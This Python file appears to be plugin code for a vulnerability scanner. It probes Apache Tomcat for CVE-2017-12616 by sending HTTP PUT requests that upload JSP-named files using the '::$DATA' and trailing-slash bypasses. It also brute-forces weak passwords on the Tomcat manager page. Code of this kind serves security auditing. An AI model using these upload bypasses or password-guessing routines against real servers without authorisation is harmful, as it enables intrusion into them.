#!/usr/bin/env python3
# encoding=utf-8
#codeby     道长且阻
#email      @ydhcui/QQ664284092

from core.plugin import BaseWebPlugin,BaseHostPlugin,brute
from lib import requests
import socket
import hashlib
import re
import base64
import time
import datetime

class Tomcat_PUT_exec(BaseWebPlugin):
    bugname = "Tomcat代码执行漏洞"
    bugrank = "高危"
    bugnumber = "CVE-2017-12616"
    bugdesc = "当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行。影响版本:Apache Tomcat 7.0.0 - 7.0.79（7.0.81修复不完全）"
    bugnote = "https://mp.weixin.qq.com/s/dgWT3Cgf1mQs-IYxeID_Mw"

    def filter(self,web):
        return 'tomcat' in web.content

    def verify(self,web, user='', pwd='',timeout=10):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        post_data = "this-is-a-test-shell"
        time_stamp = time.mktime(datetime.datetime.now().timetuple())
        m = hashlib.md5(str(time_stamp).encode(encoding='utf-8'))
        md5_str = m.hexdigest()
        vulnurl = []
        vulnurl.append(web.url + "/" + md5_str +".jsp::$DATA")
        vulnurl.append(web.url + "/" + md5_str +".jsp/")
        for url in vulnurl:
            try:
                req = requests.put(url, data=post_data, headers=headers, timeout=timeout, verify=False)
                if req.status_code == 201:# and post_data in requests.get(web.url+'/'+md5_str+'.jsp').text:
                        self.bugaddr = url
                        return True
            except Exception as e:
                print(e)


class Tomcat_weak_pass(BaseWebPlugin):
    bugname = "tomcat 后台弱口令"
    bugrank = "高危"

    def filter(self,web):
        return (('tomcat' in web.content)or('jsp' in web.content)) and requests.get(web.url+"/manager/html", verify=False).status_code == 401

    @brute
    def verify(self,web, user='tomcat', pwd='',timeout=10):
        headers = {
               "Authorization":"Basic " + base64.b64encode(("%s:%s"%(user,pwd)).encode()).decode(),
               "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
               "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"}

        vulnurl = web.url + "/manager/html"
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.status_code == 200 and r"Applications" in req.text and r"Manager" in req.text:
                self.bugaddr = "%s:%s@%s"%(user,pwd,vulnurl)
                return True
        except Exception as e:
            print(e)
